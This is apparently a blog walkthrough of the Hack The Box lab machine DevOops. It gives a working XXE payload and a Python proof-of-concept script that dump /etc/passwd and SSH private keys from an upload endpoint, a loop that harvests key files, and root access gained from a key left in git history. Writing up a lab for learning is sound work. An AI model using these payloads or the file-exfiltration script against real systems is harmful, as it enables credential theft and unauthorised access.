---
title: 'HTB DevOops - Medium'
date: 2024-05-20 00:00:00 +0000
categories: [HTB Machines]
tags: [Medium, Linux, HTB]
---
**DevOops** is a medium HTB machine where you need to exploit an **XXE injection** to **exfiltrate a user's SSH private key**. Root-level access is achievable by **inspecting the Git commits**. One of them contains a private key that belongs to the root user. By today's standards, this would be considered an easy machine, but it is still good practice.

<img src="/assets/img/devoops/Untitled.png" alt="Untitled.png" style="width:600px;">

# Reconnaissance

Started with an Nmap scan with [nmap4lazy](https://github.com/duskb1t/nmap4lazy), a simple script I created.

```
sudo python3 ~/Desktop/tools/nmap4lazy/nmap4lazy.py -t 10.129.219.224

[+] Scanning all TCP ports...

[+] Command being used:

/usr/bin/nmap 10.129.219.224 -p- -sS -Pn -n --min-rate 5000

[+] Open ports: 

22, 5000

[+] NSE Scan in process. This might take a while...

[+] Command being used:

/usr/bin/nmap 10.129.219.224 -sVC -p22,5000

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-19 22:37 WEST
Nmap scan report for 10.129.219.224
Host is up (0.061s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 42:90:e3:35:31:8d:8b:86:17:2a:fb:38:90:da:c4:95 (RSA)
|   256 b7:b6:dc:c4:4c:87:9b:75:2a:00:89:83:ed:b2:80:31 (ECDSA)
|_  256 d5:2f:19:53:b2:8e:3a:4b:b3:dd:3c:1f:c0:37:0d:00 (ED25519)
5000/tcp open  http    Gunicorn 19.7.1
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
|_http-server-header: gunicorn/19.7.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.10 seconds

[+] Script finished successfully
```

This horrible page receives us on port TCP/5000 XDD.

<img src="/assets/img/devoops/Untitled 1.png" alt="Untitled 1.png" style="width:800px;">

<img src="/assets/img/devoops/Untitled 2.png" alt="Untitled 2.png" style="width:800px;">

Brute-forced the web root with [Feroxbuster](https://github.com/epi052/feroxbuster), discovering an upload endpoint.

```bash
feroxbuster --url http://10.129.219.224:5000/ --wordlist /usr/share/seclists/Discovery/Web-Content/common.txt -C 404 -E
200      GET     1816l    15358w   962741c http://10.129.219.224:5000/feed
200      GET        1l       39w      347c http://10.129.219.224:5000/upload
```

It has a file upload functionality.

<img src="/assets/img/devoops/Untitled 3.png" alt="Untitled 3.png" style="width:800px;">

Created an XML file to test it out.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<root>
	<Author>aaa</Author>
	<Subject>bbb</Subject>
	<Content>ccc</Content>
</root>
```

Uploaded the file, analyzing the request in Burp Suite. The server responded to us.

<img src="/assets/img/devoops/Untitled 4.png" alt="Untitled 4.png" style="width:800px;">

# Exploitation

Dumped the /etc/passwd file with a basic XXE injection payload.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE mandangon [
<!ENTITY dusk SYSTEM "file:///etc/passwd">
]>
<root>
	<Author>aaa</Author>
	<Subject>&dusk;</Subject>
	<Content>ccc</Content>
</root>
```

<img src="/assets/img/devoops/Untitled 5.png" alt="Untitled 5.png" style="width:800px;">

Created a Python PoC to exfiltrate the files more easily.

```python
import argparse
import requests
import textwrap
import sys

def exploit(target, file, write_to_disk):
    url = f'http://{target}:5000/upload'
    payload = textwrap.dedent(f'''\
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE mandangon [
        <!ENTITY dusk SYSTEM "file://{file}">
        ]>
        <root>
            <Author>aaa</Author>
            <Subject>&dusk;</Subject>
            <Content>ccc</Content>
        </root>''')
    files = {
        'file': ('text.xml', payload, 'text/xml')
    }

    try:
        response = requests.post(url, files=files)
        
        # show or save the file
        if response.text:
            formatted_response = '\n'.join(response.text.split('\n')[2:-4])[10:].strip()
            if write_to_disk:
                filename = f'{file.split("/")[-1]}.dmp'
                with open(f'./{filename}', "w") as f:
                    print(f"\n[+] Saved {file} as {filename}")
                    f.write(formatted_response)
            else:
                print(f'\n[+] Dumped {file}:\n\n{formatted_response}')

    except requests.ConnectionError:
        print(f"\n[!] Could NOT read {file} :(")
        sys.exit(1)

def set_arguments():
    parser = argparse.ArgumentParser(
        description="HTB DevOops exploit"
    )
    parser.add_argument('-t', '--target', required=True)
    parser.add_argument('-f', '--file', required=True)
    parser.add_argument('-w', '--write', help="write file to disk", action='store_true', dest='write')
    return parser.parse_args()

def main():
    try:
        args = set_arguments()
        exploit(args.target, args.file, args.write)
        sys.exit(0)

    except KeyboardInterrupt:
        print("\n[!] Keyboard interrumpt detected. Quitting!")
        sys.exit(1)

main()
```

Used the  `-w` flag to download the file.

```bash
python3 devoops.py -t 10.129.219.224 -f /etc/passwd -w

[+] Saved /etc/passwd as passwd.dmp
```

Discovered two other users, besides root.

```bash
cat passwd.dmp | grep sh$
root:x:0:0:root:/root:/bin/bash
git:x:1001:1001:git,,,:/home/git:/bin/bash
roosa:x:1002:1002:,,,:/home/roosa:/bin/bash
```

Successfully read roosa’s SSH private key.

```bash
for key in {'id_rsa','id_dsa','id_ecdsa','roosa.key','id_ed25519'}; do python3 devoops.py -t 10.129.219.224 -f /home/roosa/.ssh/${key}; done

[+] Dumped /home/roosa/.ssh/id_rsa:

-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAuMMt4qh/ib86xJBLmzePl6/5ZRNJkUj/Xuv1+d6nccTffb/7
9sIXha2h4a4fp18F53jdx3PqEO7HAXlszAlBvGdg63i+LxWmu8p5BrTmEPl+cQ4J
R/R+exNggHuqsp8rrcHq96lbXtORy8SOliUjfspPsWfY7JbktKyaQK0JunR25jVk
v5YhGVeyaTNmSNPTlpZCVGVAp1RotWdc/0ex7qznq45wLb2tZFGE0xmYTeXgoaX4
...
```

Downloaded the private key.

```bash
python3 devoops.py -t 10.129.219.224 -f /home/roosa/.ssh/id_rsa -w

[+] Saved /home/roosa/.ssh/id_rsa as id_rsa.dmp
```

Set the right permissions `chmod 600 id_rsa.dmp` and connected via SSH to read the flag.

```
ssh -i id_rsa.dmp roosa@10.129.219.224
roosa@devoops:~$ whoami
roosa

roosa@devoops:~$ hostname
devoops

roosa@devoops:~$ cat user.txt 
f23d440a22a551fd****************
```

# PrivEsc

There was a user called ‘git’, so I decided to look for .git directories.

```
roosa@devoops:~$ find / -name .git 2>/dev/null
/home/roosa/work/blogfeed/.git
```

We have full access as the owner.

```bash
roosa@devoops:~$ ls -lah /home/roosa/work/blogfeed/ | grep .git
drwxrwx--- 8 roosa roosa 4.0K Mar 26  2021 .git
```

Inspecting the logs `git log -c` led us to discover another private key.

<img src="/assets/img/devoops/Untitled 6.png" alt="Untitled 6.png" style="width:800px;">

Successfully connected as root with the obtained key. All that is left is to read the final flag. GGs!

```
ssh -i commit.key root@10.129.219.224
root@devoops:~# whoami
root

root@devoops:~# hostname
devoops

root@devoops:~# cat /root/root.txt
e8cf97957a35ba57****************
```